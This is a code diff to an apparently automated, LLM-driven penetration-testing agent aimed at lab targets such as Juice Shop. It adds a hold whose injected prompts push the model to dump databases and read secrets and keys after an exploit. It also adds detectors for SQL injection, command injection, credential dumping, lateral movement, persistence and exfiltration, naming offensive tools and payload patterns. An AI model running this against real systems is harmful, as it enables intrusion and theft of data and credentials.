+    def _post_proof_hold_active(self) -> bool:
+        """Whether a post-proof deepening hold is currently active."""
+        try:
+            if not self.post_proof_hold_target or not self.post_proof_hold_vuln_id:
+                return False
+            min_actions = int(self.post_proof_hold_min_actions or 0)
+            if min_actions <= 0:
+                return False
+            return int(self.post_proof_hold_actions or 0) < min_actions
+        except Exception:
+            return False
+
+    def _post_proof_hold_violation(self, cmd: str) -> Optional[str]:
+        """Block scans/pivots immediately after proof until we deepen impact."""
+        try:
+            tgt = self.post_proof_hold_target
+            vid = self.post_proof_hold_vuln_id
+            if not tgt or not vid:
+                return None
+            if self.post_proof_hold_actions >= int(self.post_proof_hold_min_actions or 0):
+                self._clear_post_proof_hold()
+                return None
+
+            # Block scan-like commands during the hold (forces impact actions).
+            if self._is_scan_like_command(cmd):
+                self.post_proof_hold_blocks += 1
+                if self.post_proof_hold_blocks > int(self.post_proof_hold_max_blocks or 0):
+                    self._log("POST-PROOF HOLD released (too many blocked commands)", "WARN")
+                    self._clear_post_proof_hold()
+                    return None
+                return (
+                    f"⛔ POST-PROOF HOLD: You just proved exploitation on **{tgt}** (vuln id: {vid}).\n"
+                    "STOP scanning/pivoting. Your NEXT action must deepen impact on the SAME target.\n\n"
+                    "Do ONE of:\n"
+                    "1. Use obtained token/session to access protected endpoints and dump sensitive data\n"
+                    "2. Dump DB tables (`sqlmap --dump`)\n"
+                    "3. Read secrets/configs/keys exposed by the app (e.g., backups, .env, config files)\n\n"
+                    f"Hint: artifacts are in `{self.log_dir}` (see `arsenal.json` for tokens)."
+                )
+
+            # Block pivot to different targets until hold is satisfied.
+            cmd_targets = {self._normalize_target_token(t) for t in self._extract_targets_from_command(cmd or "") if t}
+            cmd_targets.discard("")
+            if cmd_targets:
+                # Treat aliases as equivalent to avoid false pivot blocks when the model mixes
+                # `juiceshop` and its resolved IP (e.g., 172.21.0.x) in the same command.
+                tgt_equiv = {tgt}
+                try:
+                    if self.target_aliases:
+                        if tgt in self.target_aliases:
+                            tgt_equiv.add(self.target_aliases[tgt])
+                        for k, v in self.target_aliases.items():
+                            if v == tgt:
+                                tgt_equiv.add(k)
+                except Exception:
+                    pass
+
+                if not cmd_targets.issubset(tgt_equiv):
+                    self.post_proof_hold_blocks += 1
+                    if self.post_proof_hold_blocks > int(self.post_proof_hold_max_blocks or 0):
+                        self._log("POST-PROOF HOLD released (too many blocked commands)", "WARN")
+                        self._clear_post_proof_hold()
+                        return None
+                    return (
+                        f"⛔ POST-PROOF HOLD: Pivot blocked. Stay on **{tgt}** and deepen impact for vuln id: {vid}.\n"
+                        "Execute an exploitation/deepening command against the SAME target now."
+                    )
+            return None
+        except Exception:
+            return None
+
+    def _note_post_proof_hold_execution(self, execution: Execution) -> None:
+        """Count post-proof deepening actions (after the proof iteration)."""
+        try:
+            tgt = self.post_proof_hold_target
+            if not tgt or not self.post_proof_hold_vuln_id:
+                return
+            if self.post_proof_hold_actions >= int(self.post_proof_hold_min_actions or 0):
+                self._clear_post_proof_hold()
+                return
+            # Do not count the proof iteration itself.
+            if int(getattr(execution, "iteration", 0) or 0) <= int(self.post_proof_hold_start_iteration or 0):
+                return
+
+            cmd = execution.content or ""
+            cmd_targets = {self._normalize_target_token(t) for t in self._extract_targets_from_command(cmd) if t}
+            cmd_targets.discard("")
+
+            # Treat known aliases as equivalent (e.g., juiceshop <-> 172.21.0.x).
+            tgt_equiv = {tgt}
+            try:
+                if self.target_aliases:
+                    if tgt in self.target_aliases:
+                        tgt_equiv.add(self.target_aliases[tgt])
+                    for k, v in self.target_aliases.items():
+                        if v == tgt:
+                            tgt_equiv.add(k)
+            except Exception:
+                pass
+
+            if cmd_targets:
+                expanded = set(cmd_targets)
+                try:
+                    if self.target_aliases:
+                        for t in list(cmd_targets):
+                            if t in self.target_aliases:
+                                expanded.add(self.target_aliases[t])
+                        for k, v in self.target_aliases.items():
+                            if v in cmd_targets:
+                                expanded.add(k)
+                except Exception:
+                    pass
+                if not (expanded & tgt_equiv):
+                    return
+
+            combined = ((execution.stdout or "") + "\n" + (execution.stderr or "")).strip()
+            evidence = self._detect_exploitation_evidence(combined, cmd)
+            has_evidence = bool(evidence)
+
+            # Don't count failed executions unless they still produced strong evidence.
+            if not bool(getattr(execution, "success", False)) and not has_evidence:
+                return
+
+            intent = self._classify_command_intent(cmd)
+            if intent != "exploit" and not has_evidence:
+                return
+
+            self.post_proof_hold_actions += 1
+            if self.post_proof_hold_actions >= int(self.post_proof_hold_min_actions or 0):
+                self._log(f"POST-PROOF HOLD satisfied: {self.post_proof_hold_vuln_id} on {tgt}", "INFO")
+                self._clear_post_proof_hold()
+        except Exception:
+            return
+
     def _save_vuln_tracker(self):
         """Persist vuln tracker to disk with state consistency enforcement."""
         try:
@@ -4954,6 +7826,9 @@ Continue the assessment - provide the next commands."""
             for vid, v in self.vulns_found.items():
                 if not isinstance(v, dict):
                     continue
+                # Avoid leaking secrets into persisted state (tokens/passwords).
+                if isinstance(v.get("details"), str) and v.get("details"):
+                    v["details"] = self._redact_sensitive(v.get("details", ""))[:2000]
                 if v.get("exploited") and v.get("proof") and v.get("not_exploitable_reason"):
                     v["not_exploitable_reason"] = ""
                 # Cap attempts list to prevent unbounded growth (keep first 3 + last 10)
@@ -4962,6 +7837,8 @@ Continue the assessment - provide the next commands."""
                     v["attempts"] = attempts[:3] + attempts[-10:]
             with open(self.vuln_tracker_path, "w") as f:
                 json.dump(self.vulns_found, f, indent=2)
+            self._sync_structured_findings_from_vuln_tracker()
+            self._save_structured_findings()
         except Exception:
             pass
 
@@ -5066,6 +7943,16 @@ Continue the assessment - provide the next commands."""
         import re
         if "sqlmap" in cmd_lower or re.search(r"(union|or\s*1=1|sleep\(|benchmark\()", cmd_lower):
             vid = self._pick_matching_vuln_id(["sql", "injection"])
+            if vid:
+                return vid
+
+        # Command injection / RCE probes (HTTP cmd= patterns or shell metacharacters)
+        if "cmd=" in cmd_lower or "debug.aspx" in cmd_lower:
+            vid = self._pick_matching_vuln_id(["command", "cmd", "rce", "code execution"])
+            if vid:
+                return vid
+        if re.search(r"(;|\\||&&)\\s*(whoami|id|uname|dir|net\\s+user|net\\s+users|cat\\s+/etc/passwd|type\\s+c:)", cmd_lower):
+            vid = self._pick_matching_vuln_id(["command", "cmd", "rce", "code execution", "injection"])
             if vid:
                 return vid
 
@@ -5203,7 +8090,9 @@ Continue the assessment - provide the next commands."""
 
     # Pre-compiled redaction patterns (avoids re.compile on every call)
     _REDACT_JWT_FULL = re.compile(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}')
-    _REDACT_JWT_TRUNC = re.compile(r'eyJ[a-zA-Z0-9_-]{20,}(?:\.[a-zA-Z0-9_-]{20,}){0,2}')
+    # Truncated JWTs frequently show up in LLM outputs/logs (e.g., TOKEN="eyJ0eXAiOiJ..."),
+    # so keep this pattern intentionally aggressive to avoid leaking even partial tokens.
+    _REDACT_JWT_TRUNC = re.compile(r'eyJ[a-zA-Z0-9_-]{10,}(?:\.[a-zA-Z0-9_-]{10,}){0,2}')
     _REDACT_BEARER = re.compile(r'(authorization:\s*bearer\s+)\S+', re.IGNORECASE)
     _REDACT_PASSWORD = re.compile(r'("password"\s*:\s*")[^"]+(")', re.IGNORECASE)
 
@@ -5245,11 +8134,33 @@ Continue the assessment - provide the next commands."""
         if "curl " in cmd_lower or (execution.tool_used or "").lower() == "curl":
             out = self._strip_curl_progress(out)
         out_lower = out.lower()
+        html_like = any(tok in out_lower for tok in ("<!doctype", "<html", "<head", "<body", "<title", "text/html"))
+
+        # ================================================================
+        # WEAK-EVIDENCE PRE-FILTER: Reject trivially insufficient proof
+        # before any vuln-specific checks. This prevents false positives
+        # from echo/mkdir/ping/ls commands that don't demonstrate real exploitation.
+        # ================================================================
+        _weak_cmd_prefixes = ("echo ", "mkdir ", "touch ", "ping ", "traceroute ", "sleep ")
+        _cmd_stripped = cmd.strip()
+        _cmd_first = _cmd_stripped.split("|")[0].split("&&")[0].split(";")[0].strip().lower()
+        _is_weak_cmd = any(_cmd_first.startswith(p) for p in _weak_cmd_prefixes)
+        # Also reject if command is ONLY ls/cat with no pipe to further processing
+        if _cmd_first.startswith("ls ") and "|" not in cmd and ">" not in cmd:
+            _is_weak_cmd = True
+        if _is_weak_cmd:
+            self._log(f"PROOF REJECTED (weak command): {cmd[:100]}", "WARN")
+            return False, f"(weak command — not exploitation proof: {cmd[:80]})"
 
         def _extract_jwts(text: str) -> List[str]:
             if not text:
                 return []
-            return re.findall(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', text)
+            # Full JWT (3 segments) is ideal, but stdout snippets are often truncated.
+            # Accept a truncated JWT-like prefix as evidence too (header.payload or longer),
+            # while keeping the pattern strict enough to avoid random base64 strings.
+            full = re.findall(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', text)
+            trunc = re.findall(r'eyJ[a-zA-Z0-9_-]{20,}(?:\.[a-zA-Z0-9_-]{20,}){0,2}', text)
+            return list(dict.fromkeys(full + trunc))
 
         def _has_json_role_admin(text_lower: str) -> bool:
             if not text_lower:
@@ -5276,12 +8187,99 @@ Continue the assessment - provide the next commands."""
             if proof:
                 file_proofs.append(proof)
 
-        # Prefer artifact-based proof when present (works for curl -o, redirects, dumps).
+        # Reject trivially short output (less than 20 chars is almost never real proof).
+        # Exception: uid=/root:x markers or a saved artifact file (e.g. curl -o /tmp/out).
+        if len(out.strip()) < 20 and not file_proofs:
+            if not (re.search(r'\buid=\d+\b', out_lower) or "root:x:" in out_lower):
+                return False, f"(output too short for proof: {len(out.strip())} chars)"
+
+        def _looks_like_single_token(s: str) -> bool:
+            s = (s or "").strip()
+            if not s:
+                return False
+            # Single-line, no separators: likely a nonce/CSRF token rather than exploitation proof.
+            if any(ch in s for ch in (" ", "\t", "\n", "\r", ":", "=", "{", "}", "[", "]", "<", ">", "\"", "'")):
+                return False
+            if re.fullmatch(r"[a-f0-9]{20,}", s.lower()):
+                return True
+            if re.fullmatch(r"[A-Za-z0-9_-]{20,}", s):
+                return True
+            return False
+
+        # Prefer artifact-based proof when present, but reject weak artifacts (e.g. CSRF token files)
+        # that don't demonstrate actual exploitation.
         if file_proofs:
-            snippet = file_proofs[0][:500]
-            snippet = self._redact_sensitive(snippet)
-            red_cmd = self._redact_sensitive(cmd[:400])
-            return True, f"cmd: {red_cmd}\nproof:\n{snippet}"[:800]
+            is_auth_like = any(tok in vtype for tok in ("credential", "creds", "token", "jwt", "auth", "login", "password", "session"))
+            is_sqli_vuln = ("sql injection" in vtype) or ("sqli" in vtype) or ("sql" in vtype and "nosql" not in vtype)
+            sensitive_path_markers = (
+                "/etc/passwd",
+                "/etc/shadow",
+                ".env",
+                "config",
+                "id_rsa",
+                "authorized_keys",
+                ".ssh/",
+                "wp-config",
+                "web.xml",
+                "settings.php",
+                "database",
+                "dump",
+                "passwd",
+                "shadow",
+            )
+            for fp in file_proofs[:3]:
+                first, _, rest = fp.partition("\n")
+                content = (rest or "").strip()
+                first_lower = (first or "").lower()
+                # Ignore binary-only proofs (metadata only) for vuln proof.
+                if "(binary)" in first_lower or not content:
+                    continue
+                # Extract path from "file:/path ..." prefix
+                path = ""
+                try:
+                    if first_lower.startswith("file:"):
+                        path = first.split()[0][5:]
+                except Exception:
+                    path = ""
+                path_lower = path.lower()
+
+                content_lower = content.lower()
+                token_like = _looks_like_single_token(content)
+                if token_like and not is_auth_like:
+                    continue
+
+                # SQLi auth bypass: JWT/token saved to an artifact file is valid proof.
+                # This avoids missing proof when stdout is truncated but the artifact file has full content.
+                if is_sqli_vuln:
+                    if _extract_jwts(content) or ("\"authentication\"" in content_lower and "\"token\"" in content_lower):
+                        red_cmd = self._redact_sensitive(cmd[:400])
+                        red_fp = self._redact_sensitive(fp[:500])
+                        return True, f"cmd: {red_cmd}\nproof:\n{red_fp}"[:800]
+
+                # Auth/token/creds findings: accept JWTs or explicit credential-like content.
+                if is_auth_like:
+                    if _extract_jwts(content) or (":" in content and len(content) < 200 and "\n" not in content):
+                        red_cmd = self._redact_sensitive(cmd[:400])
+                        red_fp = self._redact_sensitive(fp[:500])
+                        return True, f"cmd: {red_cmd}\nproof:\n{red_fp}"[:800]
+
+                # Sensitive file paths are strong proof for non-auth vulns.
+                if path_lower and any(m in path_lower for m in sensitive_path_markers):
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_fp = self._redact_sensitive(fp[:500])
+                    return True, f"cmd: {red_cmd}\nproof:\n{red_fp}"[:800]
+
+                # Generic strong markers in content.
+                if _generic_strong_markers(content_lower):
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_fp = self._redact_sensitive(fp[:500])
+                    return True, f"cmd: {red_cmd}\nproof:\n{red_fp}"[:800]
+
+                # Heuristic: multi-line or structured content of reasonable size counts as proof.
+                if len(content) >= 80 and (content.count("\n") >= 1 or ":" in content or "=" in content):
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_fp = self._redact_sensitive(fp[:500])
+                    return True, f"cmd: {red_cmd}\nproof:\n{red_fp}"[:800]
 
         # Generic "RCE-ish" proof signals (tightened): require an actual uid= line.
         if execution.success and re.search(r'\buid=\d+\b', out_lower):
@@ -5290,13 +8288,26 @@ Continue the assessment - provide the next commands."""
             return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
 
         # SQL injection proof (prefer sqlmap signals).
-        if "sql" in vtype or "injection" in vtype:
+        is_sqli_vuln = ("sql injection" in vtype) or ("sqli" in vtype) or ("sql" in vtype and "nosql" not in vtype)
+        if is_sqli_vuln:
             if "sqlmap" in cmd_lower and execution.success:
                 # Require DB/table/dump signals (avoid treating "is vulnerable" alone as proof).
                 proof_markers = (
                     "available databases", "database:", "table:", "dumping", "retrieved", "entries",
                 )
-                if any(m in out_lower for m in proof_markers) and ("table:" in out_lower or "database:" in out_lower or "dumping" in out_lower):
+                # sqlmap --dbs proof: "available databases" + at least one listed DB item.
+                if "available databases" in out_lower:
+                    if re.search(r"\[\*\]\s*[a-z0-9_\-$]{2,}", out_lower):
+                        red_cmd = self._redact_sensitive(cmd[:400])
+                        red_out = self._redact_sensitive(out[:500])
+                        return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+                # sqlmap --tables/--dump proof: explicit Database:/Table:/Dumping signals.
+                if any(m in out_lower for m in proof_markers) and (
+                    "dumping" in out_lower
+                    or "database:" in out_lower
+                    or "table:" in out_lower
+                    or "entries" in out_lower
+                ):
                     red_cmd = self._redact_sensitive(cmd[:400])
                     red_out = self._redact_sensitive(out[:500])
                     return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
@@ -5339,19 +8350,52 @@ Continue the assessment - provide the next commands."""
         if any(k in vtype for k in ("lfi", "traversal", "file inclusion", "information disclosure", "path traversal")):
             if execution.success:
                 # Info disclosure: exposed backup/secret-ish file is proven by retrieving non-trivial content.
-                disclosure_exts = (".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z", ".sql", ".db", ".sqlite", ".env")
+                disclosure_exts = (
+                    ".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z",
+                    ".sql", ".db", ".sqlite", ".env",
+                    ".yml", ".yaml", ".json", ".conf", ".ini", ".properties", ".log",
+                    ".kdbx", ".pem", ".key",
+                )
+                # Prevent false "file read" proofs from generic 404/403/stack traces or other error bodies.
+                error_markers = (
+                    "not found",
+                    "no such file",
+                    "permission denied",
+                    "access denied",
+                    "unauthorized",
+                    "forbidden",
+                    "cannot get",
+                    "method not allowed",
+                )
                 if "information disclosure" in vtype or "disclosure" in vtype:
-                    disclosure_exts = (".bak", ".old", ".backup", ".zip", ".tar", ".tgz", ".gz", ".7z", ".sql", ".db", ".sqlite", ".env")
-                    if "/ftp/" in cmd_lower and any(ext in cmd_lower for ext in disclosure_exts) and len(out) >= 80:
+                    if html_like:
+                        return False, self._redact_sensitive(out[:300])
+                    # Ensure the sensitive extension appears on the /ftp/ path itself (not elsewhere in a chained command).
+                    ftp_paths = re.findall(r"/ftp/[^\s\"']+", cmd_lower)
+                    ftp_sensitive = any(any(ext in p for ext in disclosure_exts) for p in ftp_paths)
+                    if ftp_sensitive and len(out) >= 80:
+                        if any(e in out_lower for e in error_markers):
+                            return False, self._redact_sensitive(out[:300])
                         red_cmd = self._redact_sensitive(cmd[:400])
                         red_out = self._redact_sensitive(out[:500])
                         return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
                 # Path traversal/LFI proof: treat non-trivial file retrieval as evidence.
                 if ("traversal" in vtype or "lfi" in vtype or "file inclusion" in vtype or "path traversal" in vtype):
-                    if ("/ftp/" in cmd_lower or "../" in cmd_lower) and any(ext in cmd_lower for ext in disclosure_exts) and len(out) >= 80:
-                        red_cmd = self._redact_sensitive(cmd[:400])
-                        red_out = self._redact_sensitive(out[:500])
-                        return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+                    if not html_like:
+                        ftp_paths = re.findall(r"/ftp/[^\s\"']+", cmd_lower)
+                        ftp_sensitive = any(any(ext in p for ext in disclosure_exts) for p in ftp_paths)
+                        looks_like_json = out.strip().startswith("{") or out.strip().startswith("[")
+                        multiline = out.count("\n") >= 1
+                        structured = looks_like_json or (multiline and (":" in out or "=" in out))
+                        if (ftp_sensitive and len(out) >= 80) or ("../" in cmd_lower and structured and len(out) >= 80):
+                            if any(e in out_lower for e in error_markers):
+                                return False, self._redact_sensitive(out[:300])
+                            red_cmd = self._redact_sensitive(cmd[:400])
+                            red_out = self._redact_sensitive(out[:500])
+                            return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+                # Avoid accepting generic error pages as proof even if they contain "password"/"token" strings.
+                if any(e in out_lower for e in error_markers):
+                    return False, self._redact_sensitive(out[:300])
                 passwd_like = ("root:x:" in out_lower) and ("/bin/" in out_lower or ":/usr/" in out_lower)
                 if passwd_like and len(out) >= 40:
                     red_cmd = self._redact_sensitive(cmd[:400])
@@ -5365,12 +8409,19 @@ Continue the assessment - provide the next commands."""
                     return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
             return False, self._redact_sensitive(out[:300])
 
-        # Mass assignment / broken access control: role/admin in response.
+        # Mass assignment / broken access control: require BOTH role:admin AND
+        # a successful HTTP response with real JSON data (not just any output mentioning "admin").
         if "mass assignment" in vtype or "idor" in vtype or "access control" in vtype:
             if execution.success and _has_json_role_admin(out_lower):
-                red_cmd = self._redact_sensitive(cmd[:400])
-                red_out = self._redact_sensitive(out[:500])
-                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+                # Tightened: require actual JSON response body (not just LLM text mentioning admin)
+                looks_like_json = out.strip().startswith("{") or out.strip().startswith("[")
+                has_http_success = _has_http_200(out_lower) or looks_like_json
+                # Require the command to be an actual HTTP request (curl/wget/etc), not just any command
+                is_http_request = any(t in cmd_lower for t in ("curl ", "wget ", "http", "requests."))
+                if has_http_success and is_http_request and len(out.strip()) >= 20:
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_out = self._redact_sensitive(out[:500])
+                    return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
             return False, self._redact_sensitive(out[:300])
 
         # File upload proof: require actual code execution evidence (uid=/passwd) or artifact write/readback.
@@ -5440,6 +8491,197 @@ Continue the assessment - provide the next commands."""
                 return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
             return False, self._redact_sensitive(out[:300])
 
+        # ================================================================
+        # DATABASE ACCESS proof: successful connection, query results, DB metadata
+        # ================================================================
+        if "database" in vtype or "db access" in vtype:
+            db_tools = ("mssqlclient", "impacket-mssqlclient", "mysql", "psql", "sqsh", "crackmapexec mssql")
+            if any(t in cmd_lower for t in db_tools) and execution.success:
+                db_proof = (
+                    "sql>", "mssql>", "mysql>", "1>",
+                    "master", "tempdb", "information_schema", "model", "msdb",
+                    "server version", "logged in", "connected to",
+                    "table_name", "column_name", "database_name",
+                    "select", "rows affected", "changed database",
+                )
+                if any(m in out_lower for m in db_proof) and len(out) >= 30:
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_out = self._redact_sensitive(out[:500])
+                    return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # REMOTE SERVICE ACCESS proof: SMB shares, RDP session, WinRM shell
+        # ================================================================
+        if "remote service" in vtype or "service access" in vtype:
+            smb_proof = ("sharename", "disk", "ipc$", "admin$", "c$",
+                        "pwn3d!", "[+]", "os:", "domain:",
+                        "session setup ok", "smb", "signing:")
+            rdp_proof = ("connected", "freerdp", "session", "logon successful")
+            winrm_proof = ("evil-winrm", "ps >", "powershell", "shell access")
+            ssh_proof = ("last login", "welcome", "$ ", "# ", "microsoft windows")
+            all_proof = smb_proof + rdp_proof + winrm_proof + ssh_proof
+            is_remote_tool = any(tok in cmd_lower for tok in ("smbclient", "crackmapexec", "nxc", "evil-winrm", "xfreerdp", "rdesktop", "ssh "))
+            has_auth = any(tok in cmd_lower for tok in (" -u ", "-u ", " -p ", "-p ", "password=", "pass=", "hashes", "authorization:"))
+            strong_markers = ("pwn3d!", "admin$", "c$", "command shell", "nt authority", "ps >", "powershell", "last login")
+            if execution.success and is_remote_tool and has_auth and any(m in out_lower for m in all_proof) and any(m in out_lower for m in strong_markers) and len(out) >= 20:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # DEBUG ENDPOINT / INFO DISCLOSURE proof: any meaningful response content
+        # ================================================================
+        if "debug" in vtype or "endpoint" in vtype or "information disclosure" in vtype or "disclosure" in vtype:
+            if execution.success and len(out) >= 80 and not html_like:
+                not_error = not any(e in out_lower for e in ("404 not found", "page not found", "403 forbidden", "401 unauthorized", "method not allowed", "access denied"))
+                # Require strong sensitive-content evidence, not just generic HTML/debug text.
+                sensitive_markers = (
+                    "password", "credential", "secret", "api_key", "apikey", "token", "authorization", "private key",
+                    "connection string", "jdbc", "postgres://", "mysql://", ".env", "-----begin", "root:x:",
+                )
+                marker_hits = sum(1 for marker in sensitive_markers if marker in out_lower)
+                if not_error and marker_hits >= 2:
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_out = self._redact_sensitive(out[:500])
+                    return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # REMOTE CODE EXECUTION proof (Windows-aware): whoami, ipconfig, systeminfo, hostname
+        # ================================================================
+        if "remote code execution" in vtype:
+            win_rce_proof = (
+                "nt authority", "desktop-", "microsoft windows", "ipconfig",
+                "windows_nt", "systeminfo", "host name:", "os name:",
+                "c:\\windows", "c:\\users", "program files",
+            )
+            linux_rce_proof = ("uid=", "root:x:", "/bin/", "linux", "/home/")
+            all_rce = win_rce_proof + linux_rce_proof
+            if execution.success and any(m in out_lower for m in all_rce) and len(out) >= 10:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            # Also accept if output shows actual command execution results
+            if execution.success and ("whoami" in cmd_lower or "id" in cmd_lower or "ipconfig" in cmd_lower or "hostname" in cmd_lower):
+                if len(out.strip()) >= 5 and out.strip() not in ("", "(no output)", "(no stdout)"):
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_out = self._redact_sensitive(out[:500])
+                    return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # DEFAULT CREDENTIALS proof: successful login, dashboard/welcome page
+        # ================================================================
+        if "default cred" in vtype or "weak cred" in vtype:
+            if execution.success:
+                success_markers = ("dashboard", "welcome", "logged in", "success",
+                                 "set-cookie", "session", "token", "authenticated",
+                                 "admin panel", "management")
+                fail_markers = ("invalid", "incorrect", "failed", "wrong password", "unauthorized")
+                has_success = any(m in out_lower for m in success_markers)
+                has_fail = any(m in out_lower for m in fail_markers)
+                if has_success and not has_fail and len(out) >= 30:
+                    red_cmd = self._redact_sensitive(cmd[:400])
+                    red_out = self._redact_sensitive(out[:500])
+                    return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # PRIVILEGE ESCALATION proof: SYSTEM/root access confirmed
+        # ================================================================
+        if "privilege escalation" in vtype or "privesc" in vtype:
+            privesc_proof = (
+                "nt authority\\system", "nt authority\\\\system",
+                "uid=0", "root", "administrator",
+                "getsystem", "successfully", "impersonat",
+                "privilege", "elevated",
+            )
+            if execution.success and any(m in out_lower for m in privesc_proof) and len(out) >= 10:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # CREDENTIAL DUMPING proof: hash patterns, SAM/NTDS output
+        # ================================================================
+        if "credential dump" in vtype or "cred dump" in vtype:
+            dump_proof = (
+                "aad3b435", ":::", "$ntlm$", "nthash",
+                "sam hive", "lsa secrets", "dpapi",
+                "password:", "hash:", "[*]",
+            )
+            if execution.success and any(m in out_lower for m in dump_proof) and len(out) >= 20:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # LATERAL MOVEMENT proof: shell on another host
+        # ================================================================
+        if "lateral" in vtype:
+            lateral_proof = (
+                "opened", "session", "c:\\", "powershell",
+                "[+]", "shell access", "command shell",
+                "microsoft windows", "connected",
+            )
+            if execution.success and any(m in out_lower for m in lateral_proof) and len(out) >= 20:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # PERSISTENCE proof: task/service/key created
+        # ================================================================
+        if "persistence" in vtype:
+            persist_proof = (
+                "success", "created", "added", "enabled",
+                "the command completed", "registered",
+                "task created", "service created",
+            )
+            if execution.success and any(m in out_lower for m in persist_proof) and len(out) >= 10:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # DATA EXFILTRATION proof: successful transfer
+        # ================================================================
+        if "exfiltration" in vtype or "exfil" in vtype:
+            exfil_proof = (
+                "uploaded", "transferred", "sent", "bytes",
+                "100%", "complete", "saved", "written",
+            )
+            is_upload_cmd = any(tok in cmd_lower for tok in ("--upload", "--data-binary @", " | curl", " | nc", "scp ", "smbclient", "put ", "mput "))
+            has_transfer_proof = any(m in out_lower for m in exfil_proof)
+            has_failure = any(m in out_lower for m in ("connection refused", "timed out", "error", "failed", "denied", "not found", "0 bytes"))
+            if execution.success and is_upload_cmd and has_transfer_proof and not has_failure and len(out) >= 10:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
+        # ================================================================
+        # SENSITIVE DATA ACCESS proof: file content returned
+        # ================================================================
+        if "sensitive" in vtype or "data access" in vtype or "collection" in vtype:
+            sensitive_markers = (
+                "root:x:", "uid=", "gid=", "-----begin", "ssh-rsa", "password", "token", "secret", "api_key", "apikey",
+                "insert into", "create table", "rows in set", "information_schema", "database",
+            )
+            marker_hits = sum(1 for marker in sensitive_markers if marker in out_lower)
+            has_failure = any(m in out_lower for m in ("not found", "no such file", "permission denied", "access denied", "unauthorized", "forbidden"))
+            if execution.success and len(out) >= 60 and marker_hits >= 2 and not has_failure:
+                red_cmd = self._redact_sensitive(cmd[:400])
+                red_out = self._redact_sensitive(out[:500])
+                return True, f"cmd: {red_cmd}\noutput:\n{red_out}"[:800]
+            return False, self._redact_sensitive(out[:300])
+
         # Default: require success + high-signal markers (avoid long-but-meaningless output).
         if execution.success and len(out) >= 40 and _generic_strong_markers(out_lower):
             red_cmd = self._redact_sensitive(cmd[:400])
@@ -5503,19 +8745,62 @@ Continue the assessment - provide the next commands."""
         attempt = {
             "iteration": self.iteration,
             "timestamp": execution.timestamp,
-            "command": (execution.content or "")[:400],
+            "command": self._redact_sensitive((execution.content or "")[:400]),
             "success": bool(execution.success),
             "exit_code": execution.exit_code,
-            "evidence": out.strip()[:500],
+            "evidence": self._redact_sensitive(out.strip()[:500]),
             "technique": technique,
         }
         v["attempts"].append(attempt)
         # Cap stored attempts to prevent unbounded growth (keep first 5 + last 15)
         if len(v["attempts"]) > 20:
             v["attempts"] = v["attempts"][:5] + v["attempts"][-15:]
+
+        # Fast false-positive invalidation for common decoy patterns.
+        # Example: labs that include HTML comments hinting at /debug.aspx?cmd=... but the endpoint 404s.
+        try:
+            import re
+            vtype_lower = str(v.get("type") or "").lower()
+            details_lower = str(v.get("details") or "").lower()
+            cmd_lower = (execution.content or "").lower()
+            out_lower = (out or "").lower()
+
+            if "debug.aspx" in (details_lower + " " + cmd_lower) and ("command" in vtype_lower or "rce" in vtype_lower or "injection" in vtype_lower):
